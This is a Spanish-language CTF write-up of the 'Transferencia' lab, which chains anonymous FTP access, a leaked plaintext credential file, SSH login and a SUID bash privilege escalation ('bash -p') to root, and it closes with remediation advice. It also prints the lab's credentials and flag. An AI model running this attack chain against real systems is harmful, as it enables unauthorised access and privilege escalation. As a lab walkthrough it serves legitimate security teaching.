---
title: "WhoamI Labs - Transferencia"
date: 2026-08-10 08:55:00 +0000
categories: [CTF, WhoamiLabs]
tags: [ftp, anonymous-access, credential-exposure, ssh, suid, privesc]
---

## 📋 Resumen Ejecutivo

El laboratorio "Transferencia" expone un servidor con **FTP anónimo habilitado**, permitiendo la descarga sin autenticación de un archivo con credenciales en texto plano. Una de esas credenciales es válida para **SSH**, y una vez dentro, un binario **`/usr/bin/bash` con el bit SUID activado** permite escalar directamente a `root` sin necesidad de exploits adicionales.

| Campo | Valor |
|---|---|
| Plataforma | WhoamI Labs |
| Dificultad | Fácil |
| IP objetivo | 172.17.0.3 |
| Vulnerabilidad principal | FTP anónimo → Credential Exposure → SSH → SUID Privesc |

> ⚠️ **Nota sobre el despliegue:** el primer intento de desplegar este laboratorio falló.  

## 🔍 Reconocimiento

```bash
nmap -sV 172.17.0.3
```
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.5
22/tcp open ssh OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp open http nginx

![nmap -sV — tres servicios expuestos](/assets/img/posts/whoami-labs-transferencia/01-nmap-sV.png)

Tres puertos abiertos: FTP, SSH y HTTP. El nombre "Transferencia" apunta directamente al FTP como vector probable — profundizamos ahí primero con un escaneo de scripts.

```bash
nmap -A 172.17.0.3
```
21/tcp open ftp vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x 1 65534 65534 4096 Nov 27 2025 pub
22/tcp open ssh OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp open http nginx
|_http-title: Transferencia

![nmap -A — confirma FTP anónimo habilitado](/assets/img/posts/whoami-labs-transferencia/02-nmap-A-ftp-anon.png)

**Hallazgo crítico:** `ftp-anon: Anonymous FTP login allowed` — el servidor FTP acepta login sin credenciales. Este es el punto de entrada.

## 💥 Explotación — FTP Anónimo

```bash
ftp 172.17.0.3
```

Login con usuario `anonymous` y cualquier password (convención estándar de FTP anónimo):
Name (172.17.0.3:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.

![Sesión FTP anónima exitosa](/assets/img/posts/whoami-labs-transferencia/03-ftp-login-anon.png)

Listado del directorio remoto y descarga del archivo encontrado:
ftp> ls
ftp> get usuarios.txt

![Descarga de usuarios.txt vía FTP](/assets/img/posts/whoami-labs-transferencia/04-ftp-get-usuarios.png)

## 🔑 Exposición de Credenciales

```bash
cat usuarios.txt
```
carlos:qwerty
maria:123456
guest:guest
admin:admin
test:user123
alberto:admin123

![Contenido del archivo — credenciales en texto plano](/assets/img/posts/whoami-labs-transferencia/05-cat-usuarios-txt.png)

**Hallazgo:** seis pares usuario:contraseña en texto plano, sin ningún tipo de hash o cifrado — expuestos vía un servicio sin autenticación. Clasifica como **CWE-522 (Insufficiently Protected Credentials)** combinado con **CWE-287 (Improper Authentication — FTP anónimo)**.

## 🕸️ Enumeración web (paralela)

```bash
gobuster dir -u http://172.17.0.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```
index.html (Status: 200) [Size: 391]

![Gobuster — solo index.html, sin superficie adicional](/assets/img/posts/whoami-labs-transferencia/06-gobuster-enum.png)

El servicio web en el puerto 80 no aporta más superficie de ataque — confirma que el vector real es la cadena FTP → SSH.

## 🔓 Acceso vía SSH

Con la lista de credenciales obtenida, se prueba acceso SSH. La credencial `alberto:admin123` resulta válida:

```bash
ssh alberto@172.17.0.3
```

![Login SSH exitoso con credenciales filtradas](/assets/img/posts/whoami-labs-transferencia/07-ssh-login-alberto.png)

## ⬆️ Escalada de Privilegios — SUID Misconfiguration

Enumeración de binarios con el bit SUID activado:

```bash
find / -perm -4000 -type f 2>/dev/null
```
/usr/sbin/exim4
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/bash
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

![Enumeración de binarios SUID — /usr/bin/bash presente](/assets/img/posts/whoami-labs-transferencia/08-find-suid.png)

**Hallazgo crítico:** `/usr/bin/bash` tiene el bit SUID activo — esto **no es normal**, `bash` nunca debería tener SUID en un sistema bien configurado, ya que permite a cualquier usuario obtener un shell con los privilegios del dueño del binario (root, en este caso). Es uno de los vectores de escalada más directos y está catalogado en [GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid).

```bash
/usr/bin/bash -p
whoami
```

**Desglose:** el flag `-p` (*privileged*) le dice a bash que **no** resetee el UID efectivo al UID real al arrancar — sin este flag, bash detecta automáticamente que corre vía SUID y se "degrada" a los privilegios del usuario real por seguridad. Con `-p`, bash conserva el UID efectivo heredado del bit SUID (root).
root

![bash -p seguido de whoami confirmando uid root](/assets/img/posts/whoami-labs-transferencia/09-bash-p-root.png)

## 🚩 Flag

```bash
cat /root/flag.txt
```

**Flag:** `@n0n_h@CKEr`

![Lectura de la flag como root](/assets/img/posts/whoami-labs-transferencia/10-flag-root-cat.png)

![Laboratorio completado — flag validada por la plataforma](/assets/img/posts/whoami-labs-transferencia/11-lab-completed-validation.png)

## 📊 Cadena de Explotación (Kill Chain)

Recon (nmap)
→ FTP anónimo habilitado (ftp-anon script)
→ Descarga de usuarios.txt vía FTP
→ Credenciales en texto plano expuestas
→ Login SSH con credencial válida (alberto:admin123)
→ Enumeración de binarios SUID
→ Abuso de bash con SUID (bash -p)
→ Escalada a root
→ Flag

## 🛡️ Recomendaciones de Remediación

1. **FTP Anónimo:** deshabilitar `anonymous_enable=YES` en `vsftpd.conf` a menos que sea estrictamente necesario para el caso de uso; si se requiere, restringir a solo lectura de contenido público sin datos sensibles.
2. **Exposición de credenciales:** nunca almacenar credenciales en texto plano en ubicaciones accesibles sin autenticación; usar hashing (bcrypt/argon2) y gestores de secretos.
3. **Contraseñas débiles/reutilizadas:** `admin123` es trivialmente adivinable; forzar políticas de complejidad y longitud mínima.
4. **SUID en bash:** eliminar el bit SUID de binarios que no lo requieren explícitamente (`chmod u-s /usr/bin/bash`); auditar periódicamente con `find / -perm -4000` contra una lista blanca conocida.

## 🧠 Lecciones aprendidas

- `ftp-anon` en el escaneo de nmap (`-A` o `--script ftp-anon`) es una de las señales más rápidas de bajo esfuerzo/alto impacto — siempre vale la pena intentarlo apenas se ve el puerto 21 abierto.
- Reutilización de credenciales entre servicios (el archivo listaba varias, pero solo una funcionaba en SSH) refuerza la importancia de probar **todas** las credenciales encontradas contra **todos** los servicios de autenticación disponibles, no asumir que la primera es la correcta.
- `find / -perm -4000` debería ser un paso reflejo en cualquier enumeración post-explotación — SUID misconfigurations siguen siendo uno de los vectores de privesc más comunes y rápidos de verificar en sistemas Linux.
- Un despliegue de laboratorio puede fallar por infraestructura incompleta sin que sea culpa del atacante ni de la metodología — verificar integridad del paquete (hash) y, si el problema persiste, re-intentar o reportar antes de asumir que el enfoque técnico está mal.


